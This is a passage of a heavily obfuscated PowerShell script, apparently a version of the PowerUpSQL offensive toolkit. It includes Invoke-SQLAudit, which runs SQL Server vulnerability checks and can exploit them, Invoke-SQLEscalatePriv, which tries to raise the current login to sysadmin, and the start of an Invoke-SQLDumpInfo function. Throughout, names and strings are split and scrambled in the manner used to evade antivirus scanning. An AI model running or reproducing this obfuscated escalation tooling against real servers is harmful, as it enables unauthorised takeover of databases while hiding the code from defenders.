        ${ti`medOU`TtA`skS} = ${F`AlSE}

        
    }

    Process {

        
        if(${b`ouNd})
        {
            ${alL`OBjE`c`TS} = ${InPuT`O`B`jeCt}
        }
        Else
        {
            [void]${all`oBJ`ects}.("{0}{1}" -f 'a','dd').Invoke( ${I`NPu`Tob`JecT} )
        }
    }

    End {

        
        Try
        {
            
            ${tO`TalC`Ou`NT} = ${A`l`LOB`JeCTs}."cO`UNt"
            ${scRipt:`cO`MP`le`TEdcOUNT} = 0
            ${sTaR`TEdCO`U`Nt} = 0

            foreach(${o`BJe`ct} in ${aL`LoB`Je`CTS})
            {
                

                
                ${pO`W`eRS`hELl} =   (  VariABLE ("Lnz"+"5f") -vALuEoNlY  )::("{0}{1}" -f'Crea','te').Invoke()

                if (${VERBOS`eP`REF`eR`eNCe} -eq ("{0}{1}" -f 'Con','tinue'))
                {
                    [void]${p`o`we`RSHELL}.("{0}{1}{2}" -f'Ad','dS','cript').Invoke({
                            ${vErb`o`s`E`p`REfeReNCe} = ("{2}{1}{0}" -f'nue','onti','C')
                    })
                }

                [void]${Po`w`ERSh`eLL}.("{0}{2}{3}{1}"-f'AddS','ipt','c','r').Invoke(${ScrIPt`B`LO`cK}).("{3}{2}{1}{0}" -f'nt','e','m','AddArgu').Invoke(${o`BJ`ECT})

                if (${P`AraMeT`eR})
                {
                    [void]${p`owerS`hEll}.("{2}{1}{0}"-f'nt','e','AddArgum').Invoke(${Par`AME`TEr})
                }

                
                if (${u`S`iNGVarIa`B`LedA`Ta})
                {
                    Foreach(${uS`I`Ngva`Riab`le} in ${us`inGVAr`Ia`BL`Ed`ATA})
                    {
                        
                        [void]${p`O`wErSh`ELL}.("{2}{1}{0}"-f'nt','rgume','AddA').Invoke(${USin`g`VAri`Ab`Le}."vAL`Ue")
                    }
                }

                
                ${p`OWers`H`elL}."ruN`sPAcEP`oOL" = ${r`UNsP`AcepOOL}

                
                ${TE`MP} = '' | &("{1}{2}{0}"-f't','Select','-Objec') -Property ("{2}{1}{0}" -f 'erShell','ow','P'), ("{0}{2}{1}"-f'Star','Time','t'), ("{0}{1}"-f'objec','t'), ("{1}{2}{0}"-f 'e','Runspa','c')
                ${T`Emp}."poW`eRshE`ll" = ${p`oW`ershELl}
                ${Te`mP}."s`TAr`TTI`mE" = &("{0}{1}" -f 'Get','-Date')
                ${T`EMp}."OBj`Ect" = ${Ob`JeCT}

                
                ${T`eMp}."RUn`spaCE" = ${poWeR`S`HE`lL}.("{1}{2}{0}" -f'e','Begi','nInvok').Invoke()
                ${sta`R`TEDc`Ount}++

                
                
                ${Nu`Ll} = ${r`UnS`Pa`cEs}.("{1}{0}" -f'd','Ad').Invoke(${t`eMp})

                
                &("{1}{4}{0}{2}{3}" -f '-Run','G','spac','eData','et')

                
                
                ${F`iR`Str`UN} = ${t`Rue}
                while (${RUn`sP`Aces}."CO`UnT" -ge ${sCriP`T:Ma`xQ`UEUE})
                {
                    
                    if(${FIR`sTr`Un})
                    {
                        
                    }
                    ${fIR`S`TRun} = ${fa`lse}

                    
                    &("{2}{1}{4}{3}{0}"-f'ta','c','Get-Runspa','Da','e')
                    &("{2}{1}{0}" -f'eep','t-Sl','Star') -Milliseconds ${S`lEept`ImEr}
                }

                
            }

            
            &("{3}{1}{2}{4}{0}" -f 'ta','et-Runs','p','G','aceDa') -wait

            if (-not ${Q`U`iEt})
            {
                &("{0}{1}{2}{3}" -f 'Wri','te','-Pr','ogress') -Activity ("{0}{2}{1}{3}"-f 'Ru','ing Quer','nn','y') -Status ("{0}{3}{2}{1}"-f 'Sta','s','read','rting th') -Completed
            }
        }
        Finally
        {
            
            if ( (${TIm`e`d`o`UttASKS} -eq ${f`Al`SE}) -or ( (${t`imED`OuTt`AsKS} -eq ${tr`UE}) -and (${N`OcloS`eoN`TiMEOUt} -eq ${fAL`Se}) ) )
            {
                If (-not(${SU`pprE`SSVe`R`Bo`Se})){
                    &("{2}{1}{3}{0}" -f 'e','r','W','ite-Verbos') -Message ("{1}{4}{3}{5}{2}{0}" -f'ol','Closing the ru','o','ac','nsp','e p')
                }
                ${runSp`AcEP`ooL}.("{1}{0}" -f 'lose','c').Invoke()
            }

            
              (  VaRiaBle  uOvDBH  -vAlUeON )::("{0}{1}"-f'Coll','ect').Invoke()
        }
    }
}





function TES`T`-sUBnet ([string]${c`IDR}, [string]${iP})
{
    ${neTw`ork}, [int]${sub`Ne`TLeN} = ${C`iDR}.("{1}{0}" -f 't','Spli').Invoke('/')
    ${A} = [uint32[]]${NETWO`Rk}.("{1}{0}" -f'it','spl').Invoke('.')
    [uint32] ${u`NET`WorK} = (&("{1}{2}{0}{3}" -f 'S','Convert-Bi','t','hift') ${a}[0] -Left 24) + (&("{3}{4}{1}{2}{0}" -f 'rt-BitShift','nv','e','C','o') ${A}[1] -Left 16) + (&("{2}{3}{0}{1}"-f'i','tShift','Conve','rt-B') ${A}[2] -Left 8) + ${A}[3]

    ${mA`Sk} = &("{3}{2}{1}{0}{4}"-f 'Shi','-Bit','nvert','Co','ft') (-bnot [uint32]0) -Left (32 - ${SUbn`E`T`LeN})

    ${a} = [uint32[]]${I`P}.("{0}{1}" -f'spl','it').Invoke('.')
    [uint32] ${U`ip} = (&("{1}{2}{3}{0}"-f'Shift','Conv','ert-Bi','t') ${a}[0] -Left 24) + (&("{3}{1}{2}{0}"-f'ift','t-B','itSh','Conver') ${a}[1] -Left 16) + (&("{1}{0}{3}{4}{2}" -f'e','Conv','ft','r','t-BitShi') ${a}[2] -Left 8) + ${a}[3]

    ${Un`e`TwoRK} -eq (${mA`sk} -band ${U`Ip})
}


function c`onVErT-BI`T`SHi`FT {
    param (
        [Parameter(PoSitiOn = 0, MAnDaToRY = ${t`RUE})]
        [int] ${NU`MBER},

        [Parameter(PARAMeTeRSEtNAMe = "Le`Ft", MaNDatOry = ${F`ALSe})]
        [int] ${Le`Ft},

        [Parameter(ParameTERsETnAmE = "rIg`hT", MAndatOrY = ${f`A`lSE})]
        [int] ${R`IG`hT}
    ) 

    ${s`Hift} = 0
    if (${pS`cM`dL`ET}.PaRamEteRsetNamE -eq ("{1}{0}"-f'ft','Le'))
    { 
        ${SHI`Ft} = ${le`Ft}
    }
    else
    {
        ${s`HifT} = -${R`iGht}
    }

    return   (  VAriABLe  ("gMUy"+"p")  ).vAlUe::"FLO`Or"(${n`Umb`eR} *   ( GeT-vARIablE ('gmu'+'yp')  -VAlUeO )::("{1}{0}"-f'ow','P').Invoke(2,${SHi`FT}))
}















Function inV`ok`E`-Sq`LauDIT
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdAtOry = ${F`ALse},
        HelPmeSSagE = {"{1}{6}{4}{5}{7}{2}{8}{3}{0}" -f 'ount to authenticate with.','S','omain ','cc',' Se','rve','QL','r or d','a'})]
        [string]${U`se`RnAme},

        [Parameter(MAndatOrY = ${fA`Lse},
        hElpMEssaGE = {"{9}{3}{7}{2}{1}{5}{0}{4}{6}{8}"-f'sword to a','n','mai',' Server or d','uthen',' account pas','tica','o','te with.','SQL'})]
        [string]${pa`s`sworD},

        [Parameter(maNdatorY = ${fa`lSE},
        hElpmEssAgE = {"{3}{0}{1}{2}{5}{4}" -f'in','d','ows crede','W','ls.','ntia'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRed`ENt`IAL} =  ( get-ItEm  VARiABlE:0459M2 ).vAluE::"EM`PTY",

        [Parameter(MandaToRy = ${fa`l`sE},
                VaLueFROMpipelINeByPROPertYnaMe = ${T`RUE},
        helpmEssaGe = {"{5}{8}{1}{7}{2}{4}{3}{0}{6}" -f ' co','r instan',' ','o','t','SQL ','nnection to.','ce','Serve'})]
        [string]${INSta`N`CE},

        [Parameter(mANDAToRy = ${F`ALse},
        HElpMESSaGE = {(("{5}{0}{3}{4}{2}{1}"-f 'o','g.','hin','ut','put anyt','DonsKGt '))  -cREplACE ([chAr]115+[chAr]75+[chAr]71),[chAr]39})]
        [switch]${nOo`U`TPut},

        [Parameter(MANDAtOry = ${f`A`Lse},
        HELpmessaGe = {"{1}{3}{4}{6}{5}{7}{0}{2}"-f'es','Exploi','.','t vu','lnera',' i','ble','ssu'})]
        [switch]${e`XplOIT},

        [Parameter(ManDAtorY = ${F`A`lsE},
        hElPMEsSagE = {"{6}{1}{7}{5}{4}{8}{0}{3}{2}" -f 't','der ',' csv.','o','esu','te r','Fol','to wri','lts '})]
        [string]${o`UT`FoldER}
    )

    Begin
    {

        
        if(${O`UTfO`Lder}){
            if((&("{3}{0}{4}{2}{1}" -f'e','eAccess','FolderWrit','T','st-') "$OutFolder") -eq ${Fa`Lse}){
                &("{1}{0}{2}" -f'Verb','Write-','ose') -Message ("{1}{8}{0}{10}{2}{3}{6}{7}{4}{5}{9}"-f 'O HAVE WRITE ACCESS ','YOU DO','HE PR','OVI','IR','ECT','D','ED D','NT APPEAR T','ORY.','TO T')
                BREAK
            }
        }        

        
        ${t`BL`dATA} = &("{0}{1}{2}" -f 'N','ew-Obj','ect') -TypeName ("{5}{0}{4}{2}{1}{3}{6}" -f 'y','a','.D','taTab','stem.Data','S','le')
        ${nu`LL} = ${T`Bl`DATa}."cOlU`m`Ns".("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}"-f'Comp','me','uterNa'))
        ${N`ULL} = ${tbL`da`Ta}."C`olU`mns".("{0}{1}"-f'A','dd').Invoke(("{0}{1}" -f 'Instanc','e'))
        ${n`ULL} = ${T`BLda`TA}."co`LumNS".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}{3}"-f 'erab','n','Vul','ility'))
        ${Nu`lL} = ${tbL`DA`TA}."C`oLuMns".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f 'iption','D','escr'))
        ${N`UlL} = ${Tb`LD`ATa}."coLUm`Ns".("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f'on','i','Remediat'))
        ${n`UlL} = ${T`B`ldAta}."c`oluMns".("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}"-f'Se','rity','ve'))
        ${nU`lL} = ${t`BL`DAtA}."cOLu`m`Ns".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}"-f'erable','Vuln','Is'))
        ${nU`lL} = ${TblD`ATa}."C`OLu`Mns".("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{1}{2}"-f 'x','p','loitable','IsE'))
        ${n`UlL} = ${T`BL`daTA}."cOLu`M`NS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}"-f 'Explo','i','ted'))
        ${N`ULl} = ${TB`ldATA}."c`O`lUmns".("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}"-f 'Explo','d','itCm'))
        ${Nu`lL} = ${t`B`LdATA}."c`Olum`NS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f 'D','etails'))
        ${nU`Ll} = ${t`B`ldatA}."COLuM`Ns".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{2}"-f 'fer','Re','ence'))
        ${Nu`lL} = ${t`BldaTa}."cOLUm`NS".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}"-f 'thor','Au'))

        
        ${TB`L`VU`LNFuNC} = &("{2}{0}{1}" -f'b','ject','New-O') -TypeName ("{0}{1}{6}{4}{2}{5}{3}" -f'S','y','ta.D','ble','Da','ataTa','stem.')
        ${n`Ull} = ${T`BLvu`Ln`FUnC}."CO`LUMnS".("{0}{1}" -f 'A','dd').Invoke(("{3}{2}{1}{0}" -f'onName','ti','c','Fun'))
        ${Nu`Ll} = ${tBL`Vuln`FuNc}."c`ol`UMNS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}"-f 'ype','T'))
        ${TbL`V`ULnf`UNc}.("{0}{1}" -f 'C','lear').Invoke()

        &("{3}{0}{2}{1}" -f'rite','bose','-Ver','W') -Message ("{4}{0}{3}{1}{2}{6}{5}"-f' VULN','ABILITY CH','EC','ER','LOADING','S.','K')

        
        ${N`UlL} = ${Tb`lVu`LNf`Unc}."R`owS".("{1}{0}"-f'dd','A').Invoke(("{9}{7}{5}{0}{8}{1}{6}{2}{3}{4}"-f 'udi','Defau','ogin','P','w ','voke-SQLA','ltL','n','t','I'),("{2}{0}{1}" -f've','r','Ser'))   
        ${n`ULL} = ${tbl`V`UL`NFunC}."r`OWS".("{0}{1}" -f 'Ad','d').Invoke(("{4}{5}{1}{3}{6}{2}{0}" -f 'kLoginPw','-','itWea','SQL','Inv','oke','Aud'),("{0}{1}" -f'Serv','er'))
        ${nu`lL} = ${tBlvuLn`Fu`Nc}."rO`ws".("{0}{1}"-f'Ad','d').Invoke(("{3}{9}{2}{0}{7}{1}{4}{6}{5}{8}"-f 'i','ri','d','I','v','ateLog','Imperson','tP','in','nvoke-SQLAu'),("{0}{1}{2}"-f 'Ser','v','er'))
        ${nu`LL} = ${t`BLVULNF`UnC}."Ro`Ws".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{4}{5}{3}{6}{0}"-f 'nk','Inv','oke-SQLAud','ivServer','itP','r','Li'),("{1}{0}" -f'erver','S'))
        ${N`ULl} = ${tbL`V`ULn`FUnc}."R`oWs".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{4}{3}{5}{0}"-f'orthy','Invoke-SQLAud','itPrivT','ust','r','w'),("{1}{0}{2}"-f 'bas','Data','e'))
        ${N`UlL} = ${t`Bl`VuLnFU`NC}."R`Ows".("{0}{1}" -f'A','dd').Invoke(("{1}{6}{4}{8}{0}{5}{3}{2}{7}" -f 'SQLAuditPriv','In','in','Chain','ke','Db','vo','g','-'),("{1}{2}{0}"-f 'base','Dat','a'))
        ${Nu`Ll} = ${t`Bl`V`Ulnfunc}."r`OwS".("{1}{0}"-f'dd','A').Invoke(("{3}{7}{2}{6}{5}{1}{8}{0}{4}" -f 'e','a','ke-SQ','In','dure','Cre','LAuditPriv','vo','teProc'),("{0}{1}{2}" -f'Dat','a','base'))
        ${n`ULL} = ${TblvUlN`FU`NC}."R`Ows".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{3}{0}{5}{4}" -f 'e-SQLA','I','nvo','k','ee','uditPrivXpDirtr'),("{1}{0}{2}"-f'abas','Dat','e'))
        ${NU`ll} = ${t`Bl`VULnFu`Nc}."ro`Ws".("{1}{0}"-f'dd','A').Invoke(("{3}{5}{1}{2}{6}{7}{0}{4}" -f 'i','-SQLAudit','P','Inv','leexist','oke','rivX','pF'),("{1}{0}"-f 'abase','Dat'))
        ${Nu`ll} = ${tBL`Vulnf`U`NC}."rO`Ws".("{0}{1}"-f 'Ad','d').Invoke(("{0}{7}{2}{6}{3}{5}{1}{4}"-f 'Inv','dlA','ke-SQ','oleD','dmin','bD','LAuditR','o'),("{0}{2}{1}" -f 'Data','ase','b'))
        ${nu`Ll} = ${t`BLVUlnF`Unc}."r`OwS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}{3}{4}" -f 'tRoleDbO','Invoke-S','QLAudi','wne','r'),("{0}{1}" -f'D','atabase'))
        ${N`ULL} = ${tbl`VulN`F`Unc}."R`OwS".("{0}{1}"-f 'A','dd').Invoke(("{5}{3}{6}{0}{4}{2}{1}" -f'a','n','olum','ditS','taByC','Invoke-SQLAu','ampleD'),("{0}{1}"-f 'Datab','ase'))
        ${nU`Ll} = ${T`BlV`Ulnf`Unc}."R`owS".("{1}{0}"-f'dd','A').Invoke(("{3}{1}{4}{0}{2}" -f 'oke-SQLAuditSQLiSpExecuteA','n','s','I','v'),("{2}{0}{1}"-f 'a','se','Datab'))
        ${nu`lL} = ${tBL`VULnf`UNC}."R`owS".("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{6}{1}{5}{2}{3}{7}"-f 'QLA','L','pSi','gne','Invoke-S','iS','uditSQ','d'),("{1}{0}" -f'ase','Datab'))
        ${nU`LL} = ${TbL`VU`LNFU`NC}."RO`Ws".("{1}{0}"-f'dd','A').Invoke(("{2}{5}{3}{4}{0}{1}" -f'Au','toExecSp','I','d','itPriv','nvoke-SQLAu'),("{1}{2}{0}"-f 'abase','D','at')) 
         
        &("{1}{0}{3}{2}" -f'te-Verb','Wri','e','os') -Message ("{4}{1}{6}{2}{0}{8}{7}{5}{3}" -f'T','NING VUL','ERABILI','.','RUN','S','N','CHECK','Y ')
    }

    Process
    {
        
        ${T`E`sTcONn`eCTiON} = &("{1}{4}{3}{2}{0}{5}"-f'Te','Get-S','tion','nnec','QLCo','st') -Instance ${iNSta`N`cE} -Username ${uS`e`RNAme} -Password ${P`As`SwoRD} -Credential ${cREd`enTI`AL} -SuppressVerbose | &("{2}{3}{0}{1}"-f'c','t','Where-','Obje') -FilterScript {
            ${_}."s`TaTUS" -eq ("{2}{1}{0}" -f 'le','sib','Acces')
        }
        if(-not ${TEstco`NneC`Ti`On})
        {
            Return
        }

        
        if(-not ${I`NS`TaNce})
        {
            ${In`staN`CE} = ${eN`V`:CoM`P`UTernAmE}
        }

        
        &("{2}{1}{0}" -f'erbose','e-V','Writ') -Message ("$Instance "+': '+'RUN'+'NING'+' '+'VULNE'+'RABILITY'+' '+'CHE'+'CKS..'+'.')

        
        ${tBlv`ULnf`U`Nc} |
        &("{2}{0}{1}" -f'-Objec','t','ForEach') -Process {
            
            ${fUNC`TI`O`NnaMe} = ${_}."fUNCt`IO`Nn`AME"

            
            if(${ExP`LOit})
            {
                ${tb`Lte`Mp} = &("{1}{0}{3}{2}"-f 'e-Expre','Invok','sion','s') -Command ("$FunctionName "+'-In'+'st'+'ance '+"'$Instance' "+'-U'+'se'+'rnam'+'e '+"'$Username' "+'-Passw'+'o'+'rd '+"'$Password' "+'-Expl'+'oit')
            }
            else
            {
                ${TB`L`TEmp} = &("{1}{2}{0}{3}{4}" -f 'pre','Invo','ke-Ex','ss','ion') -Command ("$FunctionName "+'-Inst'+'anc'+'e '+"'$Instance' "+'-U'+'s'+'ername'+' '+"'$Username' "+'-P'+'asswo'+'rd '+"'$Password'")
            }

            
            ${tBl`Data} = ${t`BlD`ATa} + ${tb`lte`Mp}
        }

        
        &("{0}{2}{1}{3}"-f'Wr','o','ite-Verb','se') -Message ("$Instance "+': '+'CO'+'MP'+'L'+'ETED '+'VU'+'L'+'NE'+'RABILITY '+'CHE'+'C'+'K.')
    }

    End
    {
        
        &("{0}{2}{1}" -f 'Wr','te-Verbose','i') -Message ("{3}{6}{7}{1}{5}{4}{2}{0}" -f'ECKS.','ED ALL ','H','COMP','ERABILITY C','VULN','L','ET')

        
        if(${outf`ol`DER})
        {
            ${ou`TfOL`D`ErcMd} = ('ec'+'ho '+'test'+' '+'> '+"$OutFolder\test.txt")
            ${cHe`c`Ka`ccess} = (&("{4}{1}{3}{0}{2}{5}"-f'xpr','ke-','essio','E','Invo','n') -Command ${O`U`TFolder`cMd}) 2>&1
            if(${ChECKa`cC`E`sS} -like ("{1}{0}"-f '.','*denied'))
            {
                &("{0}{1}{3}{2}" -f'Write-','Ve','bose','r') -Object ("{0}{4}{1}{7}{5}{2}{8}{3}{6}" -f'A','ess de','utput di','ct','cc','ied to o','ory.','n','re')
                Return
            }
            else
            {
                &("{2}{0}{3}{1}" -f 'Ve','ose','Write-','rb') -Message ("{1}{7}{6}{8}{4}{0}{3}{5}{2}"-f 'es','Ve','ectory.','s to output','cc',' dir','fi','ri','ed write a')
                ${r`Emo`Vecmd} = ('de'+'l '+"$OutFolder\test.txt")
                &("{2}{0}{3}{1}"-f 'oke','ression','Inv','-Exp') -Command ${REmOve`c`md}
                ${OUTPu`T`inst`An`Ce} = ${inst`An`Ce}.("{0}{1}"-f 'Replac','e').Invoke('\','-').("{0}{1}{2}" -f'Re','pl','ace').Invoke(',','-')
                ${o`U`T`putPatH} = "$OutFolder\"+("{4}{7}{0}{1}{6}{3}{5}{2}" -f'SQ','L','s_','Audit','Powe','_Result','_','rUp')+${outp`UTinsTaN`ce}+("{1}{0}"-f 'csv','.')
                ${Outp`U`Ti`Ns`TANCE}
                ${OU`TPUtPa`Th}
                ${T`B`LDaTa}  | &("{2}{0}{1}"-f 'xp','ort-Csv','E') -NoTypeInformation ${O`UtP`Utp`AtH}
            }
        }

        
        if ( -not ${NOOU`Tp`Ut})
        {
            Return ${TB`lda`Ta}
        }
    }
}






Function iNVokE`-sq`LeS`Ca`l`ATEPRIV
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDatoRy = ${F`A`lsE},
        HeLpMEssagE = {"{8}{1}{7}{6}{13}{10}{4}{0}{11}{12}{3}{5}{9}{14}{2}" -f 'c','QL Serv','.','en',' domain ac','t','r','e','S','icate ','r','ou','nt to auth',' o','with'})]
        [string]${USE`RN`Ame},

        [Parameter(mANdATOry = ${F`A`lSe},
        HElpmESSaGe = {"{3}{2}{4}{7}{9}{6}{5}{0}{8}{1}" -f'pas','e with.','erver or ','SQL S','domai',' ','count','n ','sword to authenticat','ac'})]
        [string]${Pa`sS`WoRd},

        [Parameter(mANDaToRY = ${F`AlSe},
        helPmEssaGE = {"{0}{1}{3}{2}" -f 'Windows',' c','tials.','reden'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`EdentI`AL} =   $0459m2::"e`MPtY",

        [Parameter(ManDAtORy = ${f`Al`sE},
                vAlUeFROmPIPeLiNebYpRoPERtYNAME = ${TR`Ue},
        HelpmesSage = {"{5}{0}{8}{9}{7}{1}{2}{6}{4}{3}"-f 'L',' instance t','o c','to.',' ','SQ','onnection','ver',' Se','r'})]
        [string]${in`S`TAncE}
    )

    Begin
    {
    }

    Process
    {
        
        ${T`EstCO`NnEcT`IOn} = &("{2}{6}{4}{0}{5}{3}{1}"-f 'nect','t','G','nTes','Con','io','et-SQL') -Instance ${I`NStAn`ce} -Username ${u`SErna`Me} -Password ${PaSSW`o`RD} -Credential ${CREdE`Nt`iAL} -SuppressVerbose | &("{1}{3}{2}{0}"-f 't','Where-','jec','Ob') -FilterScript {
            ${_}."st`AtUS" -eq ("{1}{0}{2}" -f 'cc','A','essible')
        }
        if(-not ${T`estcONnE`ctI`On})
        {
            Return
        }

        
        if(-not ${in`St`AnCe})
        {
            ${I`N`STANce} = ${ENV`:`CoM`PUte`R`Name}
        }

        
        &("{0}{1}{2}" -f 'W','rite-','Verbose') -Message ("$Instance "+': '+'Check'+'ing'+' '+'if'+' '+('yo'+'u{'+'0}re'+' ')  -F[chaR]39+'a'+'lready '+'a '+'sys'+'adm'+'in'+'...')
        ${iS`SYS`AdMIN} = &("{3}{1}{4}{2}{0}" -f 'k','et-','ysadminChec','G','SQLS') -Instance ${Ins`TA`NcE} -Credential ${CRe`DE`NTI`AL} -Username ${UsE`R`NAmE} -Password ${paSsw`O`RD} -SuppressVerbose | &("{1}{0}{2}" -f't-Ob','Selec','ject') -Property ("{0}{2}{1}{3}" -f'Is','ad','Sys','min') -ExpandProperty ("{0}{2}{1}" -f'IsSys','dmin','a')
        if(${Is`S`YSa`dmin} -eq 'Yes')
        {
            &("{2}{1}{3}{0}" -f 'e','it','Wr','e-Verbos') -Message ("$Instance "+': '+'Y'+'ou '+'are,'+' '+'so'+' '+'no'+'t'+'hing '+'to'+' '+'do'+' '+'h'+'er'+'e. '+':)')
        }
        else
        {
            &("{3}{4}{0}{2}{1}"-f 'i','rbose','te-Ve','W','r') -Message ("$Instance "+': '+('Y'+'oubG'+'cre ')."re`PLace"('bGc',[sTriNg][cHaR]39)+'n'+'ot '+'a '+'sysa'+'dm'+'in, '+'a'+'ttemp'+'ting '+'t'+'o '+'ch'+'ange '+'that'+'..'+'.')
            &("{0}{1}{2}{3}" -f'Inv','oke','-SQLAudi','t') -Instance ${ins`Tan`CE} -Username ${UsE`RN`AME} -Password ${PAS`SWo`RD} -Credential ${crEDENT`i`Al} -NoOutput -Exploit

            
            ${iSS`ys`Ad`miN2} = &("{3}{2}{1}{4}{0}"-f'eck','Sysadmi','SQL','Get-','nCh') -Instance ${i`NSTaN`ce} -Credential ${C`RED`EntIaL} -Username ${USer`N`AmE} -Password ${pA`sS`w`ORd} -SuppressVerbose | &("{0}{2}{1}"-f 'Select-Obje','t','c') -Property ("{2}{0}{3}{1}" -f 'sadm','n','IsSy','i') -ExpandProperty ("{2}{1}{0}"-f 'sadmin','y','IsS')
            if(${i`sSYsAD`M`IN2} -eq 'Yes')
            {
                &("{1}{0}{2}" -f 'rite-Ve','W','rbose') -Message ("$Instance "+': '+'Su'+'ccess'+'! '+'Y'+'ou '+'a'+'re '+'n'+'ow '+'a '+'sysa'+'dmin!')
            }
            else
            {
                &("{1}{2}{0}"-f 'e','Wri','te-Verbos') -Message ("$Instance "+': '+'F'+'ail. '+'W'+'e '+('couldn'+'mU'+'3t ')."ReP`L`Ace"(([CHaR]109+[CHaR]85+[CHaR]51),[strIng][CHaR]39)+'ge'+'t '+'you'+' '+'s'+'ysadmi'+'n '+'access'+' '+'t'+'oday.')
            }
        }
    }

    End
    {
    }
}





Function I`N`Vo`KE-SqLDumPinFo
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdaTORy = ${F`AlsE},
        HeLPmeSsagE = {"{6}{7}{5}{0}{3}{2}{1}{8}{4}" -f 'acco','hen','aut','unt to ','icate with.','ver or domain ','SQL',' Ser','t'})]
        [string]${usERn`A`me},

        [Parameter(MANDAtorY = ${f`AlsE},
        HELpMeSsAGe = {"{4}{6}{11}{5}{1}{13}{9}{12}{7}{10}{2}{3}{0}{14}{15}{8}" -f 'cat','er or ','ut','henti','S','v','QL Se',' p','.','in ac','assword to a','r','count','doma','e wit','h'})]
        [string]${pa`sSwo`RD},

        [Parameter(maNDatoRY = ${fA`lSE},
        HElPmeSSAgE = {"{0}{3}{2}{1}" -f'W','ls.','ows credentia','ind'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`eDeN`Ti`Al} =  (variabLE 0459m2  -VAl)::"EmP`TY",

        [Parameter(mANdAtORY = ${Fa`L`sE},
                vALUeFRoMPIpELINeBYprOPerTYnAME = ${T`RUE},
        HELPmeSsage = {"{3}{0}{4}{2}{6}{5}{1}"-f 'L','.','ver instance to conn','SQ',' Ser','on to','ecti'})]
        [string]${i`N`S`TAnce},

        [Parameter(maNdATOry = ${f`AL`sE},
        heLpmEsSagE = {"{6}{5}{3}{0}{1}{2}{4}" -f'o wr','ite ou','t','t','put to.','lder ','Fo'})]
        [string]${oUTfO`L`DeR},

        [Parameter(mANdaToRy = ${FAL`SE},
        HeLPMESsAGe = {"{5}{0}{3}{4}{2}{6}{1}"-f 'it','s.','xml','e output',' to ','Wr',' file'})]
        [switch]${X`Ml},

        [Parameter(MANDAtORy = ${F`A`LsE},
        HElpMESsagE = {"{5}{3}{0}{7}{1}{6}{4}{2}"-f'te ','tpu','les.','ri','v fi','W','t to cs','ou'})]
        [switch]${C`sv},

        [Parameter(MANDAtoRy = ${f`Al`se},
        HeLpmESSAge = {"{4}{0}{6}{2}{5}{3}{1}"-f 'availa',' links.','l','L Server','Crawl ','e SQ','b'})]
        [switch]${CR`AW`Ll`InKs}
        
    )

    Begin
    {
        
        if(${ouTFo`ld`er})
        {
            ${out`FOl`DERcMD} = ('ech'+'o '+'te'+'st '+'> '+"$OutFolder\test.txt")
        }
        else
        {
            ${outf`O`LD`eR} = '.'
            ${oU`TfOLD`ERc`Md} = ('ech'+'o '+'test'+' '+'> '+"$OutFolder\test.txt")
        }

        
        ${chE`Cka`CCE`SS} = (&("{3}{0}{1}{2}"-f'Expres','si','on','Invoke-') -Command ${o`UT`FOldE`R`cmd}) 2>&1
        if(${c`H`eC`KaCcess} -like ("{2}{1}{0}"-f 'nied.','de','*'))
        {
            &("{2}{0}{1}" -f'te-Hos','t','Wri') -Object ("{7}{2}{5}{6}{4}{1}{0}{3}" -f 'r','utput di','e','ectory.','to o','ss de','nied ','Acc')
            Return
        }
        else
        {
            &("{2}{1}{0}"-f 'se','rbo','Write-Ve') -Message ("{3}{1}{4}{7}{8}{6}{5}{2}{0}"-f'y.','erif','r','V','ied','o output directo','cess t',' write ','ac')
            ${r`EMOV`eCmD} = ('de'+'l '+"$OutFolder\test.txt")
            &("{3}{1}{2}{0}" -f 'ssion','nvok','e-Expre','I') -Command ${r`eMovec`mD}
        }
    }

    Process
    {
        
        ${T`eStCoNNect`I`ON} = &("{1}{0}{4}{2}{3}"-f 't-','Ge','QL','ConnectionTest','S') -Instance ${i`NSTancE} -Username ${US`ERna`mE} -Password ${pas`s`W`ORd} -Credential ${Cre`d`e`NTiAl} -SuppressVerbose | &("{2}{0}{1}" -f'ere-O','bject','Wh') -FilterScript {
            ${_}."St`AT`US" -eq ("{0}{1}{2}" -f'A','cc','essible')
        }
        if(-not ${Te`S`TcoNNE`ctI`oN})
        {
            Return
        }

        
        if(-not ${IN`Sta`NCe})
        {
            ${INS`TANCe} = ${ENV`:CO`mput`ERn`AmE}
        }

        &("{1}{0}{2}{3}"-f'e-Ve','Writ','r','bose') -Message ("$Instance "+'- '+'START'+'..'+'.')
        ${oU`TpU`Ti`NSt`AnCE} = ${i`N`St`ANce}.("{1}{0}" -f'ace','Repl').Invoke('\','-').("{2}{0}{1}" -f 'pla','ce','Re').Invoke(',','-')

        
        &("{2}{1}{0}{3}"-f'Ver','-','Write','bose') -Message ("$Instance "+'- '+'G'+'ett'+'ing '+'n'+'on-de'+'fa'+'ult '+'databa'+'ses'+'...')
        ${re`SU`ltS} = &("{4}{1}{0}{3}{2}" -f'-SQLDa','et','se','taba','G') -Instance ${I`NS`TaNcE} -Username ${us`Er`NaME} -Password ${Pa`s`swOrd} -Credential ${cr`EdeNt`IAl} -SuppressVerbose -NoDefaults
        if(${X`ml})
        {
